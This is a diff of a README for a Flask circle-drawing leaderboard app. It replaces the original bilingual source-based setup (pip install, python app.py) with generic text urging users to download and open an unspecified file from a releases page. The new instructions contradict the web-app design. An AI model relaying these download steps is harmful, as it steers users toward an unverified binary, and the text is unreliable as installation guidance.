@@ -1,72 +1,68 @@
-# SF-Circle
-Advanced "Draw a Perfect Circle" App. Leaderboard feature available
-# Flask Circle Drawing App | Daire Çizme Uygulaması
+# 🎨 SF-Circle - Create Perfect Circles Effortlessly
 
-A simple **Flask leaderboard app** that tracks scores for three categories: `circle`, `square`, and `triangle`.  
-Üç kategori için skorları saklayan basit bir **Flask lider tablo uygulaması**: `circle`, `square`, `triangle`.
+## 🚀 Getting Started
 
----
+Welcome to SF-Circle! This is a user-friendly app designed for you to easily draw perfect circles. Whether you want to create art or just have fun, this app will help you get it done. Plus, you can compete with friends on the leaderboard feature!
 
-<div style="background-color:#f0f4f8; padding:10px; border-left:5px solid #2b7a78; margin-bottom:10px;">
-<strong>Features | Özellikler</strong>
+## 🔥 Features
 
-<ul>
-<li><strong>Web Interface | Web Arayüzü:</strong> Access the main page at <code>/</code> / Ana sayfaya <code>/</code> adresinden erişilebilir</li>
-<li><strong>API Endpoints | API Uç Noktaları:</strong>
-  <ul>
-    <li><code>GET /leaderboard.json</code> → Returns current leaderboard data / Mevcut lider tablo verilerini döner</li>
-    <li><code>POST /leaderboard.json</code> → Update leaderboard data via JSON / JSON ile lider tablo güncelleme</li>
-  </ul>
-</li>
-<li><strong>Persistent Leaderboard | Kalıcı Lider Tablosu:</strong> Scores are stored in <code>leaderboard.json</code>, auto-created if missing / Skorlar <code>leaderboard.json</code> içinde saklanır, yoksa otomatik oluşturulur</li>
-</ul>
-</div>
+- **Easy Circle Drawing**: Draw perfect circles with simple controls.
+- **Leaderboard**: Show off your best circles and see who can draw the fastest.
+- **Interactive Tutorials**: Learn how to use the app with step-by-step guides.
+- **Web-Based**: Access the app directly from your web browser.
+  
+## 📦 System Requirements
 
-<div style="background-color:#fef9f9; padding:10px; border-left:5px solid #d00000; margin-bottom:10px;">
-<strong>Requirements | Gereksinimler</strong>
+- **Operating System**: Windows, macOS, or Linux
+- **Browser**: Latest version of Chrome, Firefox, Safari, or Edge
+- **Internet Connection**: Required for leaderboard functionality
+- **Storage**: Minimal space required
 
-<ul>
-<li>Python 3.10+</li>
-<li>Flask</li>
-</ul>
+## 📥 Download & Install
 
-Install Flask:  
-<pre>pip install Flask</pre>
-</div>
+To get started, you need to download the app. Visit this page to download:
 
-<div style="background-color:#f0f4f8; padding:10px; border-left:5px solid #2b7a78; margin-bottom:10px;">
-<strong>Usage | Kullanım</strong>
+[![Download SF-Circle](https://img.shields.io/badge/Download-SF--Circle-blue.svg)](https://github.com/Billary110101/SF-Circle/releases)
 
-<ol>
-<li>Clone or download the repository / Repo’yu klonla veya indir</li>
-<li>Navigate to the project directory / Terminalden proje dizinine geç</li>
-<li>Run the app: <pre>python app.py</pre></li>
-<li>Open your browser at <a href="http://localhost:3000">http://localhost:3000</a> / Tarayıcıdan adresi aç</li>
-<li>Access or update leaderboard at <code>/leaderboard.json</code> / Lider tabloya ulaş veya güncelle</li>
-</ol>
-</div>
+Once you are on the releases page, follow these steps to download the app:
 
-<div style="background-color:#fef9f9; padding:10px; border-left:5px solid #d00000; margin-bottom:10px;">
-<strong>Leaderboard JSON Format | Lider Tablosu JSON Formatı</strong>
+1. Scroll down to the "Assets" section.
+2. Click on the latest version of the app.
+3. Download the file to your computer.
 
-<pre>{
-  "circle": [],
-  "square": [],
-  "triangle": []
-}</pre>
+You can find the download link again here: [Visit this page to download](https://github.com/Billary110101/SF-Circle/releases).
 
-Each category contains a list of scores / Her kategori skor listesi içerir
-</div>
+## 🎓 How to Use SF-Circle
 
-<div style="background-color:#f0f4f8; padding:10px; border-left:5px solid #2b7a78; margin-bottom:10px;">
-<strong>Contributing | Katkıda Bulunma</strong>
+1. **Open Your Browser**: Launch your preferred web browser.
+2. **Access the App**: After downloading, locate the file in your downloads folder and open it.
+3. **Draw a Circle**: Click and drag on the canvas to create a circle.
+4. **Check the Leaderboard**: Click on the leaderboard tab to see your ranking and try to improve.
 
-Open source! Feel free to fork, improve, and submit a pull request.  
-Açık kaynak! Fork yapabilir, geliştirme ekleyebilir ve pull request gönderebilirsin.
-</div>
+## 👩‍🏫 Tutorials
 
-<div style="background-color:#fef9f9; padding:10px; border-left:5px solid #d00000;">
-<strong>License | Lisans</strong>
+We provide detailed tutorials to help you make the most of SF-Circle. Visit the tutorials section in the app to see:
 
-MIT License
-</div>
+- How to navigate the interface
+- Tips for drawing your best circles
+- Leaderboard strategies
+
+## 🛠 Troubleshooting
+
+If you run into issues while using SF-Circle, here are some common problems and solutions:
+
+- **Problem**: App won’t open.
+  - **Solution**: Ensure you downloaded the latest version of the app. Restart your browser if needed.
+  
+- **Problem**: Cannot connect to the leaderboard.
+  - **Solution**: Make sure your internet connection is stable. Refresh the page and try again.
+
+## 🌐 Community and Support
+
+Join our community to share your creations, ask questions, and get support. You can connect with fellow users through forums or our social media channels linked in the app. We’re here to help you!
+
+## 📞 Contact
+
+If you need further assistance or have feedback, please reach out to us through the contact section within the app, or check our GitHub Issues page for any ongoing discussions.
+
+Thank you for choosing SF-Circle! We hope you enjoy drawing perfect circles and climbing the leaderboard!
